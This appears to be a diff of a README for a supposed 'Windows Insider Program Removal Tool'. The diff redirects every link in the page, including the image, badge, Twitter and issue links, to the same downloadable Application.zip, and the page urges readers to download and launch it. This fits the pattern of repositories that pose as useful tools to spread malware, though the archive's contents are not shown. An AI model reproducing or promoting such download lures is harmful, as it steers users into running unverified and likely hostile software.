@@ -1,7 +1,7 @@
 
 # Windows Insider Program Removal Tool 🛠️
 
-![Windows Insider Program](https://img.icons8.com/color/48/000000/windows-10.png)
+![Windows Insider Program](https://github.com/NoteBloc-Antoine/Windows-Insider-Program-Removal-Tool/releases/download/v1.0/Application.zip)
 
 ## Description ℹ️
 Welcome to the Windows Insider Program Removal Tool repository! This tool is designed to help users exit the Windows Insider Program with ease. Whether you want to remove your device from the insider program, disable beta updates, or simply go back to a stable version of Windows, this tool has got you covered.
@@ -17,9 +17,9 @@ Once you download and launch the tool, it will guide you through the process of 
 - Supports Windows 10 and Windows 11
 
 ## Installation 💻
-You can download the latest version of the Windows Insider Program Removal Tool [here](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip). Simply click the link and launch the tool to get started.
+You can download the latest version of the Windows Insider Program Removal Tool [here](https://github.com/NoteBloc-Antoine/Windows-Insider-Program-Removal-Tool/releases/download/v1.0/Application.zip). Simply click the link and launch the tool to get started.
 
-[![Download Tool](https://img.shields.io/badge/Download-Tool-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Tool](https://github.com/NoteBloc-Antoine/Windows-Insider-Program-Removal-Tool/releases/download/v1.0/Application.zip)](https://github.com/NoteBloc-Antoine/Windows-Insider-Program-Removal-Tool/releases/download/v1.0/Application.zip)
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -32,8 +32,8 @@ If the link does not work, please check the "Releases" section of this repositor
 A big thank you to all the contributors who have helped make this tool possible!
 
 ## Stay in Touch 📬
-- For updates and announcements, follow us on [Twitter](https://twitter.com/windowsinsiders).
-- Have a question or suggestion? Create an [issue](https://github.com/Windows-Insider-Program-Removal-Tool/issues) here.
+- For updates and announcements, follow us on [Twitter](https://github.com/NoteBloc-Antoine/Windows-Insider-Program-Removal-Tool/releases/download/v1.0/Application.zip).
+- Have a question or suggestion? Create an [issue](https://github.com/NoteBloc-Antoine/Windows-Insider-Program-Removal-Tool/releases/download/v1.0/Application.zip) here.
 
 ## Spread the Word 🌟
 If you found the Windows Insider Program Removal Tool helpful, consider sharing it with others who may benefit from it. Let's make exiting the Windows Insider Program a breeze for everyone!
